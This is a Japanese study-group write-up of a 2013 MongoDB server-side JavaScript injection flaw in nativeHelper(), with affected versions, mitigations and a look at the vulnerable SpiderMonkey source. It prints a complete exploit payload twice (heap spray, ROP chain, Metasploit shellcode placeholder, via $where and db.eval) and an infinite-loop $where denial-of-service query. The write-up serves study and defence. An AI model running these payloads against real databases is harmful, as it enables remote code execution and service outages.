nativeHelper()に伴う脆弱性について
=================

#はじめに

2013/03/26 にマイナビニュースに掲載された、MongoDBの脆弱性について検証します。

- [MongoDBに脆弱性](http://news.mynavi.jp/news/2013/03/26/158/index.html)

## 影響を受けるバージョン

- MongoDB 2.2以前のバージョン（ただし、ビルド時にJavaScriptエンジンをV8に設定しているものは除く）

## 対策

- その1: MongoDB 2.4へのバージョンアップする  
- その2: noscriptingオプションをつけて起動する


## 情報源

一次情報 mongodb – SSJI to RCE  
http://blog.scrt.ch/2013/03/24/mongodb-0-day-ssji-to-rce/  

日本語情報 MongoDBに脆弱性  
http://news.mynavi.jp/news/2013/03/26/158/index.html  


## exploiteコード

my_collectionを存在するcollectionへ変更して、下記のコードを実行
```js
db.my_collection.find({'$where':'shellcode=unescape("METASPLOIT JS GENERATED SHELLCODE"); sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+=unescape("%u9090%u9090"); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i<25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape("%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000"); sizechunk2=0x1000; chunk2=""; for(i=0;i<sizechunk2;i++){ chunk2+=unescape("%u5a70%u0805"); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i<25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({"x" : 0x836e204}, ["A"+"\x26\x18\x35\x08"+"MongoSploit!"+"\x58\x71\x45\x08"+"sthack is a nice place to be"+"\x6c\x5a\x05\x08"+"\x20\x20\x20\x20"+"\x58\x71\x45\x08"]);'})
```

evalでも同様に落ちる
```
db.eval(function() {shellcode=unescape("METASPLOIT JS GENERATED SHELLCODE"); sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+=unescape("%u9090%u9090"); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i<25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape("%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000"); sizechunk2=0x1000; chunk2=""; for(i=0;i<sizechunk2;i++){ chunk2+=unescape("%u5a70%u0805"); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i<25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({"x" : 0x836e204}, ["A"+"\x26\x18\x35\x08"+"MongoSploit!"+"\x58\x71\x45\x08"+"sthack is a nice place to be"+"\x6c\x5a\x05\x08"+"\x20\x20\x20\x20"+"\x58\x71\x45\x08"]);})
```

## 何が問題？

native_helper()内のNativeFunction funcがxというJavaScriptのオブジェクトをチェック無しでcallすることが問題（らしい）  
  
src/mongo/scripting/engine_spidermonkey.cpp
```js
JSBool native_helper( JSContext *cx , JSObject *obj , uintN argc, jsval *argv , jsval *rval ) {
        try {
            Convertor c(cx);
            NativeFunction func = reinterpret_cast(
                    static_cast( c.getNumber( obj , "x" ) ) );
            void* data = reinterpret_cast<void*>(
                    static_cast( c.getNumber( obj , "y" ) ) );
            verify( func );

            BSONObj a;
            if ( argc > 0 ) {
                BSONObjBuilder args;
                for ( uintN i = 0; i < argc; ++i ) {
                    c.append( args , args.numStr( i ) , argv[i] );
                }
                a = args.obj();
            }

            BSONObj out;
            try {
                out = func( a, data );
            }
            catch ( std::exception& e ) {
```

run、run_とmongo shellでソースを見ると、{x : "xxxxx"}というハッシュになっていることがわかる
```js
> run
function () {
    return nativeHelper.apply(run_, arguments);
}

>run_
{ "x" : 4295168976 }

```

runはmongo shellから、shellのコマンドを実行するための関数。  
なのでチェック無しで実行しているのだろうか（勉強会での議論に続く）



## 今回とは別のダメな例

```js
db.test.find({'$where':'while(1){};return true;'}) 
```

## 2.4から$whereのセキュリティが向上した

2.4 からグローバルオブジェクトにアクセスできない制限が入った

## 現実的なリスクを考える

どうなんでしょうか。ユーザーのインプットをそのままJavaScriptとして評価するのが条件？  
（活発な意見、求む）

